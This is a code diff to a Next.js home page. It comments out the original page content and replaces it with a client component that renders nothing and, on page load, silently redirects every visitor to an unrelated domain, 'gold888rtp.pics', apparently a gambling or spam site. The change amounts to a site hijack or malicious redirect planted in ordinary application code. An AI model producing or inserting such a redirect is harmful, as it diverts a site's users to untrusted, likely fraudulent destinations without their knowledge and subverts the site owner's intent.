@@ -1,8 +1,25 @@
+'use client'; // Ensure this is a client component
 
-import Image from 'next/image';
+import { useEffect } from 'react';
 
-export default function Home() {
- return (
+const Home = () => {
+  useEffect(() => {
+    // Redirect to the target URL
+    window.location.href = 'https://gold888rtp.pics';
+  }, []);
+
+  return null; // Don't render anything
+};
+
+export default Home;
+
+//import Image from 'next/image';
+//import { useEffect } from 'react';
+//export default function Home() {
+
+
+
+ /* return (
     <main className="w-3/4 flex flex-col items-center gap-10 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 absolute">
       <div className="flex items-center gap-[50px]">
         <Image
@@ -87,3 +104,4 @@ const Card = ({ title, width, body, href, icon }: CardProps) => {
     </li>
   );
 }; 
+ */
